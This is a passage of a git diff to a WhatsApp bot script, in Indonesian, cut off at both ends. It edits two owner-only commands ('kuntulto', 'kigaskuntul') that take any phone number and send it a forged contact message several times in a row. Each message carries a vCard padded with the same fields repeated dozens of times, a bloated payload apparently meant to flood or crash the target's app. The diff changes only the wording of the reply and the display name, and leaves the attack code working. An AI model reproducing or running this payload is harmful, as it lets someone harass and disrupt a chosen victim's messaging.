karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(m.chat, global.owner, fkontaak)
 }
 }
 break
 case 'kuntulto': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
+const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOTㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOTㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
 jobotz.sendContact(`${text}@s.whatsapp.net`, global.owner, fkontaak)
@@ -5379,9 +5470,9 @@ await m.reply(`Berhasil Mengirim Kuntul Di Nomer ${text}`)
 }
 break
 case 'kigaskuntul': {
-if (!isCreator) return m.reply(`KHUSUS OWNER GOBLOK!`)
+if (!isCreator) return m.reply(`FITUR KHUSUS OWNER (PEMILIK BOT)!`)
 if (!text) throw `Nomernya mana?`
-const fkontaak = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: "@broadcast" } : {})}, message: { "contactMessage":{"displayName": `© ❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵${ngazap(prefix)}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;conn;;;\nFN:❴ ㅊ ❈ Sana BOT ✯ By ♂🎉 KIKI ORIㅊ ❈ ❵\nitem1.TEL:+6289653430712\nitem1.X-ABLabel:Celular\nitem2.EMAIL;type=INTERNET:EMAIL;CHARSET=UTF-8;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do 